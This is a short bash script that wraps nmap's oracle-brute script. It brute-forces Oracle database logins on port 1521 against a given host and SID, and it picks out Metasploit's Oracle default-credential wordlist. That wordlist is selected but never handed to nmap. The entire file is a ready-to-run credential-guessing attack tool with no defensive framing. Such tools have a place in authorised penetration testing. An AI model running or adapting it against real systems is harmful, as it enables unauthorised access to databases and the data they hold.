#!/bin/bash
# Brute ORACLE login with nmap
SCRIPT_DIR=$(dirname $0)
cd ${SCRIPT_DIR}
SCRIPT_BASE=$(pwd)

if [ -z ${2} ]; then
    echo "Usage: ${0} <hostname> <sidname>"
    exit
fi

SIDNAME=${2}

BRUTELIST1='/usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt'
BRUTELIST2='/opt/metasploit/data/wordlists/oracle_default_userpass.txt'

[ -e "${BRUTELIST1}" ] && BRUTELIST=${BRUTELIST1}
[ -e "${BRUTELIST2}" ] && BRUTELIST=${BRUTELIST2}

sudo nmap --script=oracle-brute -p 1521 --script-args oracle-brute.sid=${SIDNAME} ${1} -P0
